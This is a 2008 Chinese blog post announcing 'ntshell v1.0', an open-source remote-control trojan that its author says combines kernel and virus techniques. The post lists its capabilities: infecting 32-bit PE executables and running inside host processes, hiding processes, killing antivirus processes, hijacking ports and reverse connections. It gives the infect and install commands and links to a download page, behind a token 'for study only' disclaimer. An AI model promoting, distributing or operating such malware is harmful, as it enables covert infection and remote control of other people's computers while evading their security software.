---
title: ntshell v1.0(开源代码)-结合内核和病毒技术的最新远程控制软件
description: 结合内核和病毒技术的最新远程控制软件ntshellv1.0(开源代码)这是一个免费开源的远程控制软件，源码仅供学习参考，请勿用于非法用途。
date: 2008-01-03 10:07:12
category: 安全工具
tags: ['源码', '远程控制', '木马', '病毒Virus', '软件']
post_id: 317
alias: ntshell-v1.0
ViewNums: 7762
---

**结合内核和**[**病毒**](/blog/tags/%e7%97%85%e6%af%92virus)**技术的最新远程控制[软件](/blog/tags/%e8%bd%af%e4%bb%b6)ntshell v1.0(开源代码)**
软件作者：被诅咒的神
信息来源：邪恶八进制信息安全团队（[www.eviloctal.com](http://www.eviloctal.com)）

这是一个免费开源的**[远程控制](/blog/tags/%e8%bf%9c%e7%a8%8b%e6%8e%a7%e5%88%b6)**软件，[源码](/blog/tags/%e6%ba%90%e7%a0%81)仅供学习参考，请勿用于非法用途。

功能特点：
1.提供CMDSHELL、文件管理、进程管理、端口代理（未完成）、屏幕捕获和一些其它功能

2.可感染32位PE文件，感染后可选择在宿主进程空间中运行（无进程）或创建新进程运行，在宿主进程中运行还可选择端口劫持，即复用宿主所打开的端口，感染不影响宿主正常运行

3.用到了一些内核技术，包括活动进程链脱链（隐藏进程），与ICESWORD相同的进程强杀方法（能杀掉一些杀毒软件的进程），Ring0打开文件（用于感染正在运行的可执行文件），2000/xp下采用无驱Ring0

4.同时支持正向连接和反向连接，服务端和控制端均可接受管理多个连接

感染文件方法：ntshell.exe -infect C: est.exe
ntshell.exe先用生成服务端生成

安装成系统服务：ntshell.exe -install
服务移除：ntshell.exe -remove

代码编译环境：Windows XP SP2 + VC6.0
服务端采用纯C编写，VC直接编译
控制端为C++和WTL，需在VC中加入WTL支持才能编译
![](http://photo14.yupoo.com/20071231/193243_689675198_aumglfbv.jpg)
![](http://photo15.yupoo.com/20071231/193258_94299198_sgpdaywl.jpg)
![](http://photo14.yupoo.com/20071231/193257_806654173_npehudfm.jpg)
如果您发现BUG或是有什么好的建议，请发送mail给我：ktwyz#163.com

注：由于没时间做兼容性测试，一些内核操作可能导致系统蓝屏，测试前请先保存好数据
注2：该版本尚未加入驱动支持，故暂时无法在2003下使用Ring0的全部功能

**[点此进入下载页面](/blog/download.asp?id=35)**

